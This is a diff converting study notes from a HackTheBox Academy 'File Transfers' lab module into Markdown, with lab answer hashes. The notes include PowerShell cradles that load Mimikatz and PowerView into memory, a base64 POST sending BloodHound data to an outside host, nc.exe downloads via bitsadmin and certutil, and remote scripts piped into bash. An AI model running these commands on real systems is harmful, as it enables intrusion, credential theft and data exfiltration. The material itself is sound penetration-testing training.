@@ -1,44 +1,43 @@
-HackTheBox Academy 
-==================
+# HackTheBox Academy 
 
-Module: File Transfers
-----------------------
 
-Windows File Transfer Methods
-=============================
+## Module: File Transfers
 
-PowerShell Downloads
---------------------
+
+### Windows File Transfer Methods
+
+
+#### PowerShell Downloads
+
 
 In most environments, HTTP/HTTPS traffic is allowed out of the firewall in some form - and if we have a GUI session, a web browser could also be used. However, from a Windows shell, PowerShell offers many file transfer options. In any version of PowerShell, the System.Net.WebClient class can be used to download a file over HTTP.
 
-##
+```
 PS C:\htb> (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1',"C:\Users\Public\Downloads\PowerView.ps1")
-##
+```
+From `PowerShell 3.0`, Invoke-WebRequest is also available, but it is noticeably slower at downloading files. The aliases iwr, curl, and wget can be used instead of Invoke-WebRequest.
 
-From PowerShell 3.0, Invoke-WebRequest is also available, but it is noticeably slower at downloading files. The aliases iwr, curl, and wget can be used instead of Invoke-WebRequest.
-
-##
+```
 PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
-##
+```
 
 Instead of downloading to disk, the payload can instead be executed in memory, using Invoke-Expression, or the alias iex.
 
-##
+```
 PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
-##
+```
 
 IEX also accepts pipeline input.
 
-##
+```
 PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1 | iex
-##
+```
 
 There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.
 
 This can be bypassed using the parameter -UseBasicParsing.
 
-##
+```
 PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | iex
 
 Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
@@ -47,217 +46,216 @@ At line:1 char:1
 + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 + CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
 + FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
-##
+```
 
-##
+```
 PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | iex
 PS C:\htb> Invoke-CheckLocalAdminAccess
 
 ComputerName IsAdmin
 ------------ -------
 localhost      False
-##
+```
 
 Alternatively, with administrative access to the machine, we can disable Internet Explorer’s First Run customization.
 
-##
+```
 C:\htb> reg add "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main" /f /v DisableFirstRunCustomize /t REG_DWORD /d 2
-##
+```
 
 Powershell download cradles that do not observe Internet Explorer’s first-run check can also be used. Harmj0y has compiled an extensive list of PowerShell download cradles here. It is worth gaining familiarity with them and their individual nuances, such as not observing a proxy or touching a disk to select the appropriate one for the situation.
 
-PowerShell File Uploads
------------------------
+#### PowerShell File Uploads
+
 
 It is also possible to upload files using Powershell using Invoke-WebRequest or Invoke-RestMethod.
 
-##
+```
 PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'c:/users/public/downloads/BloodHound.zip' -Encoding Byte))
 
 PS C:\htb> Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64
-##
+```
 
 After catching the base64 data with Netcat, the payload can be decoded.
 
-##
+```
 Waheed Nusrat@htb[/htb]$ echo <base64> | base64 -d -w 0 > bloodhound.zip
-##
+```
 
-Bitsadmin
----------
+#### Bitsadmin
+
 
 The Background Intelligent Transfer Service (BITS) can download files from HTTP sites and SMB shares. It "intelligently" checks host and network utilization into account to minimize the impact on a user’s foreground work.
 
-##
+```
 PS C:\htb> bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe
-##
+```
 
 PowerShell also enables interaction with BITS, enables file downloads and uploads, supports credentials, and can use specified proxy servers.
 
-##
-Download
---------
+
+##### Download
+```
 PS C:\htb> Import-Module bitstransfer;Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Temp\nc.exe"
-##
+```
 
-##
-Upload
-------
+
+##### Upload
+```
 PS C:\htb> Start-BitsTransfer "C:\Temp\bloodhound.zip" -Destination "http://10.10.10.132/uploads/bloodhound.zip" -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\svc-sql
-##
+```
 
-Certutil
---------
+### Certutil
+
 
 Casey Smith (@subTee) found that certutil can be used to download arbitrary files. It is available in all Windows versions and has been a very popular file transfer technique, essentially serving as Wget for Windows. However, the Antimalware Scan Interface (AMSI) currently detects this as malicious certutil usage.
 
-##
-Upload
-------
-C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
-##
 
-HTB Academy Question
---------------------
-# Note: Solution Can be found in the end of the file
+##### Upload
+```
+C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
+```
+
+## HTB Academy Question
+
+`Note: Solution Can be found in the end of the file`
 
 Q1: Download the file flag.txt from the web root using wget from the Pwnbox. Submit the contents of the file as your answer.
-A: b1a4ca918282fcd96004565521944a3b
+A: `b1a4ca918282fcd96004565521944a3b`
 
 Q2: Upload the attached file named upload_win.zip to the target using the method of your choice. Once uploaded, RDP to the box, unzip the archive, and run "hasher upload_win.txt" from the command line. Submit the generated hash as your answer.
-A: f458303ea783c224c6b4e7ef7f17eb9d
+A: `f458303ea783c224c6b4e7ef7f17eb9d`
 
 
-Linux File Transfer Methods
-===========================
+### Linux File Transfer Methods
 
-Wget / cURL
------------
+
+#### Wget / cURL
+
 
 Wget and cURL are installed on many Linux distributions and support uploading as well as downloading files.
 
-##
-Waheed Nusrat@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
-##
+```
+W4H33D@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
+```
 
-##
-Waheed Nusrat@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
-##
+```
+W4H33D@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+```
 
-OpenSSL
--------
+#### OpenSSL
+
 
 OpenSSL is frequently installed and is also often included in other software distributions, with sysadmins using it to generate security certificates, among other tasks. OpenSSL can be used to send files "nc style."
 
-Create certificate
-------------------
+##### Create certificate
 
-##
-Waheed Nusrat@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
-##
+```
+W4H33D@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
+```
 
-Stand up server
----------------
+### Stand up server
 
-##
-Waheed Nusrat@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
-##
 
-Download file
--------------
+```
+linux@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
+```
 
-##
-Waheed Nusrat@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
-##
+### Download file
 
-Bash (/dev/tcp)
----------------
+
+```
+htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
+```
+
+### Bash (/dev/tcp)
+
 
 There may also be situations where no obvious file transfer tools are available. In this case, as long as bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/tcp device file can be used for simple file downloads.
 
-Connect to Target's Webserver
------------------------------
-
-##
-Waheed Nusrat@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
-##
-
-HTTP GET Request
-----------------
-
-##
-Waheed Nusrat@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
-##
-
-Print the Response
-------------------
-
-##
-Waheed Nusrat@htb[/htb]$ cat <&3
-##
+#### Connect to Target's Webserver
 
 
-PHP
----
+```
+htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
+```
+
+### HTTP GET Request
+
+
+```
+htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
+```
+
+### Print the Response
+
+
+```
+htb[/htb]$ cat <&3
+```
+
+
+### PHP
+
 
 PHP is also very prevalent and provides multiple file transfer methods.
 
- File_get_contents()
- -------------------
+ ### File_get_contents()
+ 
 
- ##
-Waheed Nusrat@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
- ##
+ ```
+htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
+ ```
 
- Fopen()
- -------
+ #### Fopen()
+ 
 
- ##
-Waheed Nusrat@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote = 
+ ```
+htb[/htb]$ php -r 'const BUFFER = 1024; $fremote = 
 fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
- ##
+ ```
 
 If the php-curl module has been installed, this can alternatively be used.
 
- Php-curl
- --------
+ #### Php-curl
+ 
 
- ##
- Waheed Nusrat@htb[/htb]$ php -r '$rfile = "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"; $lfile = "LinEnum.sh"; $fp = fopen($lfile, "w+"); $ch = curl_init($rfile); curl_setopt($ch, CURLOPT_FILE, $fp); curl_setopt($ch, CURLOPT_TIMEOUT, 20); curl_exec($ch);'
- ##
+ ```
+ htb[/htb]$ php -r '$rfile = "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"; $lfile = "LinEnum.sh"; $fp = fopen($lfile, "w+"); $ch = curl_init($rfile); curl_setopt($ch, CURLOPT_FILE, $fp); curl_setopt($ch, CURLOPT_TIMEOUT, 20); curl_exec($ch);'
+ ```
 
 It is also possible to retrieve each line as an array and pipe the output to bash.
  
- ##
- Waheed Nusrat@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
- ##
+ ```
+ htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
+ ```
 
 
-Python
-------
+### Python
+
 
 Python is often present on Linux and can be used to download files when Wget and cURL are not available. Although Python isn’t currently installed by default in Windows, typing Python in a command prompt opens the Windows Store's official distribution with a single-click install. Python is frequently installed on developer and IT computers and is bundled by default with major business financial applications such as Bloomberg (Bloomberg Professional Services).
 
-Python 2
---------
+### Python 2
 
-##
-Waheed Nusrat@htb[/htb]$ python2
-##
 
-Code: python
-------------
-##
+```
+htb[/htb]$ python2
+```
+
+#### Code: python
+
+```
 import urllib
 urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")
-##
+```
 
-Python 3
---------
+### Python 3
 
-##
-Waheed Nusrat@htb[/htb]$ python3
-##
+
+```
+htb[/htb]$ python3
+```
 
 Code: python
 ------------
